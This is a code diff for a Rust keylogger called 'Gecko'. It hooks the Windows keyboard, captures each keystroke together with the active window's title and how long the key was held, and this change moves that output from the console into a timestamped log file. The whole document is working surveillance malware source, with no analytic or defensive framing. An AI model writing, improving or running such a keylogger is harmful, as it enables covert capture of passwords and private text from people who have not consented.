@@ -1,27 +1,30 @@
-use std::collections::HashMap;
-use std::sync::{Arc, Mutex};
-use std::time::{Duration, Instant};
-use std::thread;
-use std::sync::mpsc;
+use std::{collections::HashMap, sync::{Arc, Mutex}, time::{Duration, Instant}, thread, sync::mpsc, fs::File, io::Write};
 use willhook::{keyboard_hook, InputEvent, KeyboardKey};
 use winapi::um::winuser::{GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, VK_CONTROL, VK_SHIFT};
 use winapi::um::winuser::GetAsyncKeyState;
 
-pub fn activate_keylogger() {
+pub fn activate_keylogger(file: Arc<Mutex<File>>) {
     let (sender, receiver) = mpsc::channel();
     let held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>> = Arc::new(Mutex::new(HashMap::new()));
     let held_keys_clone = Arc::clone(&held_keys);
     let h = keyboard_hook().unwrap();
-    println!("Gecko activating...");
 
+    println!("Gecko activating....");
+    let mut file_guard = file.lock().unwrap();
+    writeln!(file_guard, "Gecko activated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
+    drop(file_guard);
+    let fileex = Arc::clone(&file);
     // Keyboard Event Handling thread
     let keyboard_handle = thread::spawn(move || {
-        keyboard_event_handler(h, held_keys_clone, receiver);
+        keyboard_event_handler(h, held_keys_clone, receiver, fileex);
     });
 
     loop {
         if exit_condition() {
-            println!("Gecko deactivating...");
+            println!("Gecko deactivating....");
+            let mut file_guard = file.lock().unwrap();
+            writeln!(file_guard, "Gecko deactivated at: {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")).unwrap();
+            drop(file_guard);
             if let Err(err) = sender.send(()) {
                 eprintln!("Failed to send termination signal: {}", err);
             }
@@ -33,18 +36,20 @@ pub fn activate_keylogger() {
 
     keyboard_handle.join().unwrap();
 }
-
-fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>) {
+fn keyboard_event_handler(h: willhook::Hook, held_keys: Arc<Mutex<HashMap<KeyboardKey, Instant>>>, receiver: mpsc::Receiver<()>, file: Arc<Mutex<File>>) {
     let mut last_title = String::new();
     loop {
         if let Ok(ie) = h.try_recv() {
             match ie {
                 InputEvent::Keyboard(ke) => {
                     if let Some(key) = ke.key {
-                        handle_key_event(key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title);
+                        handle_key_event(key, ke.pressed, &mut held_keys.lock().unwrap(), &mut last_title, &file);
                     }
                 }
-                _ => println!("Unknown Input event: {:?}", ie),
+                _ => {
+                    let mut file_guard = file.lock().unwrap();
+                    writeln!(&mut *file_guard, "Unknown Input event: {:?}", ie).unwrap();
+                },
             }
         }
 
@@ -61,6 +66,7 @@ fn handle_key_event(
     pressed: willhook::KeyPress,
     held_keys: &mut HashMap<KeyboardKey, Instant>,
     last_title: &mut String,
+    file: &Arc<Mutex<File>>,
 ) {
     let title = active_window();
     match pressed {
@@ -73,9 +79,9 @@ fn handle_key_event(
             if let Some(inittime) = held_keys.remove(&key) {
                 let elapsed = Instant::now().duration_since(inittime);
                 if elapsed.as_millis() < 400 {
-                    log_key(&last_title, key, None);
+                    log_key(&file, &last_title, key, None);
                 } else {
-                    log_key(&last_title, key, Some(elapsed));
+                    log_key(&file, &last_title, key, Some(elapsed));
                 }
             }
         }
@@ -84,16 +90,14 @@ fn handle_key_event(
     *last_title = title;
 }
 
-fn log_key(title: &str, key: KeyboardKey, elapsed: Option<Duration>) {
+fn log_key(file: &Arc<Mutex<File>>, title: &str, key: KeyboardKey, elapsed: Option<Duration>) {
     let local_now = chrono::Local::now();
     let local_time_string = local_now.format("%Y-%m-%d %H:%M:%S").to_string();
+    let mut file_guard = file.lock().unwrap();
     match elapsed {
-        Some(hd) => println!(
-            "{} : {} : {:?} : Pressed and held for: {:?}",
-            local_time_string, title, key, hd
-        ),
-        None => println!("{} : {} : {:?}", local_time_string, title, key),
-    }
+        Some(hd) => writeln!(&mut *file_guard, "{} : {} : {:?} : Pressed and held for: {:?}", local_time_string, title, key, hd).unwrap(),
+        None => writeln!(&mut *file_guard, "{} : {} : {:?}", local_time_string, title, key).unwrap(),
+    };
 }
 
 fn active_window() -> String {
